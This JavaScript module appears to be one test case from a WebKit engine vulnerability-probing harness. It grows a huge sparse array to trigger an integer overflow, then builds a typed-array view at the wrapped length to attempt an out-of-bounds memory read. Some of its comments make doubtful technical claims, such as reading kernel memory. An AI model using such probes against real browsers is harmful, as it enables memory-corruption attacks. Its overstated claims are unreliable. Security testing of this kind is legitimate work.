export default {
    id:       'ARRAY_MATH_INTEGER_OVERFLOW',
    category: 'Boundary',
    risk:     'CRITICAL',
    description:
        'Explora a transição de memória C++ entre Sparse (Dicionário) e Dense (Contínuo). ' +
        'Força o JSArray a alocar limites gigantes (0xFFFFFFFF) e injeta elementos para ' +
        'corromper o cálculo de capacidade do Butterfly durante a conversão.',

    setup: function() {
        this.results = {};
        // Criamos um array Sparse (com buracos massivos)
        this.vulnArray = [];
        this.vulnArray[0x7FFFFFFF] = 1.1; // Índice muito alto forçando alocação de dicionário
    },

    trigger: function() {
        try {
            // O GATILHO: Tentamos forçar o WebKit a converter o dicionário 
            // de volta para um bloco contínuo manipulando a ponta do array.
            // A soma 0x7FFFFFFF + 2 pode causar Integer Overflow interno.
            this.vulnArray.push(2.2);
            this.vulnArray.unshift(3.3); 

            // Criamos uma TypedArray corrompida a partir do tamanho overflowed
            let badLen = this.vulnArray.length;
            this.buffer = new ArrayBuffer(8);
            // Se badLen deu a volta (wrap around) ou virou negativo/gigante, 
            // a criação desta View vai apontar para a memória do Kernel/Processo.
            this.view = new Uint8Array(this.buffer, badLen, 1);
        } catch(e) {
            this.results.error = e.constructor.name;
        }
    },

    probe: [
        // Probe 0: O C++ permitiu a matemática maluca sem RangeError?
        s => s.results.error || s.vulnArray.length,
        
        // Probe 1: A VIEW CORROMPIDA (OOB Read)
        s => {
            if (s.view) {
                try {
                    let val = s.view[0];
                    if (val !== undefined && val !== 0) {
                        return `💥 SUCESSO! Leu Ram Nativa OOB: 0x${val.toString(16)}`;
                    }
                    return 'Leu Zeros (Seguro)';
                } catch(e) { return `Falha na leitura: ${e.message}`; }
            }
            return 'View Protegida';
        }
    ],

    cleanup: function() {
        this.vulnArray = null;
        this.buffer = null;
        this.view = null;
        this.results = {};
    }
};
